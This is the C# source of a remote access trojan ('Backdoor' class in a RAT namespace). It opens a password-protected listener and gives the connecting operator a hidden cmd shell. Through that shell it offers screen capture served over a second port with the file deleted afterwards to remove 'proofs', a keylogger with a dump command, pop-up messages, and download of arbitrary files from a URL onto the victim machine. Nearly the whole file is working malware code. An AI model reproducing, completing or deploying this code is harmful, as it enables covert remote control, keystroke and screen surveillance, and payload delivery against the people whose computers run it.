using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using RAT;

namespace RAT
{
    public class Backdoor
    {
        TcpListener Listener;
        Socket Socket;
        Process Shell;
        StreamReader FromShell;
        StreamWriter ToShell;
        StreamReader InStream;
        StreamWriter OutStream;
        Thread ShellReaderThread;
        Thread KeyloggerThread;
        KeyLogger Keylogger;

        int Port { get; set; }
        string Name { get; set; }
        string Password { get; set; }
        bool Verbose { get; set; }

        public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
        {
            this.Port = port;
            this.Name = serverName;
            this.Password = password;
            this.Verbose = verbose;
        }

        public void StartServer()
        {
            Console.Title = "RAT Server:" + Port;
            try
            {
                if (Verbose) Log("Listening on port " + Port);

                Listener = new TcpListener(IPAddress.Any, Port);
                Listener.Start(); // blocking call
                Socket = Listener.AcceptSocket();

                if (Verbose) Log("Client connected: " + Socket.RemoteEndPoint);

                Stream s = new NetworkStream(Socket);
                InStream = new StreamReader(s, Encoding.ASCII);
                OutStream = new StreamWriter(s, Encoding.ASCII);
                OutStream.AutoFlush = true;

                OutStream.WriteLine("Pswd:");
                string checkPass = InStream.ReadLine();

                if (Verbose) Log("Client tried password " + checkPass);
                if (!checkPass.Equals(Password))
                {
                    if (Verbose) Log("Incorrect Password");
                    DropConnection();
                    return;
                }
                if (Verbose) Log("Password Accepted.");


                StartShell();
            }
            catch (Exception e)
            {
                Log("<ERROR> Something happened:");
                Log(e.ToString());
            }
            finally
            {
                CloseShell();
            }
        }

        void StartShell()
        {
            Shell = new Process();
            ProcessStartInfo p = new ProcessStartInfo("cmd")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true
            };
            Shell.StartInfo = p;
            Shell.Start();

            ToShell = Shell.StandardInput;
            FromShell = Shell.StandardOutput;
            ToShell.AutoFlush = true;

            // start sending output to the user
            ShellReaderThread = new Thread(new ThreadStart(SendShellOutput));
            ShellReaderThread.Start();

            // welcome message
            OutStream.WriteLine(String.Format("  Welcome to {0} RAT  ", Name).AlignCenter(80, '='));
            OutStream.WriteLine("  SINGLE-USER MODE  ".AlignCenter(80, '='));

            InputLoop();
        }

        void SendShellOutput()
        {
            string buffer = "";
            while ((buffer = FromShell.ReadLine()) != null)
            {
                OutStream.WriteLine(buffer + "\r");

                // temporary, for logging
                Console.ForegroundColor = ConsoleColor.Cyan;
                Log(buffer);
                Console.ResetColor();
            }
            CloseShell();
        }

        void InputLoop()
        {
            string tempBuff = "";
            while (((tempBuff = InStream.ReadLine()) != null))
            {
                if (Verbose) Log(">> " + tempBuff);
                HandleCommand(tempBuff);
            }
        }

        void HandleCommand(string command)
        {
            switch (command)
            {
                case RatAction.SCREENSHOT:
                    if (Verbose) OutStream.WriteLine("Taking a screenshot...");
                    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
                    WindowsHelper.MakeScreenshot(path);

                    Log("Image is hosted at port 2790");
                    OutStream.WriteLine("Image is hosted at port 2790");
                    HostImage(path);
                    Log("Image Sent < OK > !");
                    // delete all proofs
                    File.Delete(path);
                    Log("Image deleted");
                    if (Verbose) OutStream.WriteLine("Screenshot downloaded and deleted successfully!");
                    break;
                case RatAction.KEYLOGGER_START:
                    if (Keylogger != null)
                    {
                        Keylogger.StopAndDump();
                    }
                    Keylogger = new KeyLogger();
                    KeyloggerThread = new Thread(new ThreadStart(Keylogger.Start));
                    KeyloggerThread.Start();
                    break;
                case RatAction.KEYLOGGER_DUMP:
                    string dump = Keylogger.StopAndDump();
                    KeyloggerThread.Abort();
                    KeyloggerThread = null;
                    OutStream.WriteLine("Captured input:");
                    OutStream.WriteLine(dump);
                    break;
                case RatAction.SHOW_MESSAGE:
                    if (Verbose) Log("Show message mode");
                    OutStream.WriteLine("Title:");
                    string title = InStream.ReadLine();
                    OutStream.WriteLine("Content");
                    string content = InStream.ReadLine();

                    OutStream.WriteLine(String.Format("Do you really want to show message:\r\n=========\r\n{0}\r\n========\r\n{1}\r\n\r\n[Y/N]", title, content));
                    string response = InStream.ReadLine();
                    if (response.Equals("y"))
                    {
                        OutStream.WriteLine("Message shown");
                        new Thread(delegate () { MessageBox.Show(content, title, MessageBoxButtons.OK); }).Start();
                        Log("Message shown");
                    }
                    else
                    {
                        Log("Message denied");
                        OutStream.WriteLine("MessageBox showing denied by the user");
                    }
                    break;
                case RatAction.DOWNLOAD_FILE:
                    if (Verbose) Log("File download mode");

                    OutStream.WriteLine("Enter URL of desired file to download:");
                    string url = InStream.ReadLine();
                    OutStream.WriteLine("FileName/Path on remote computer:");
                    string filePath = InStream.ReadLine();
                    try
                    {
                        using (var client = new WebClient())
                        {
                            client.DownloadFile(url, filePath);
                        }
                        OutStream.WriteLine("File downloaded successfully");
                        Log("File downloaded successfully");
                    }
                    catch (Exception e)
                    {
                        if (Verbose) Log("Exception during file download:");
                        OutStream.WriteLine("Exception during file download:" + e);
                        Log(e.ToString());
                    }

                    break;
                case RatAction.QUIT:
                    OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                    CloseShell();
                    break;
                default:
                    ToShell.WriteLine(command + "\r\n");
                    break;
            }
        }

        void HostImage(string path)
        {
            string responseHeaders =
                "HTTP/1.1 200 OK\r\n" +
                "Server: google.com\r\n" +
                "Content-Length: " + new FileInfo(path).Length + "\r\n" +
                "Content-Type: image/png\r\n" +
                "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
                "\r\n";

            //headers should ALWAYS be ascii. Never UTF8
            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);

            var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
            lstr.Start();
            Log("Waiting for client to connect...");
            var webSocket = lstr.AcceptSocket();

            webSocket.Send(headerBytes);
            webSocket.SendFile(path);
            webSocket.Close();
            lstr.Stop();
        }

        public void DropConnection()
        {
            if (Verbose) Log("Dropping Connection");
            InStream.Dispose();
            OutStream.Dispose();
            Socket.Close();
            Listener.Stop();
            // Console.Beep(382, 500);
        }

        string GenerateNLineBreaks(int n)
        {
            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < n; i++)
            {
                sb.Append("\r\n");
            }
            return sb.ToString();
        }

        public void CloseShell()
        {
            try
            {
                if (Verbose) Log("Closing shell process");
                if (Shell != null)
                {
                    Shell.Close();
                    Shell.Dispose();
                }
                if (ShellReaderThread != null)
                {
                    ShellReaderThread.Abort();
                    ShellReaderThread = null;
                }
                ToShell.Dispose();
                FromShell.Dispose();
                Shell.Dispose();

                DropConnection();
            }
            catch (Exception) { }
        }

        void Log(string message)
        {
            Console.WriteLine(message);
        }
    }
}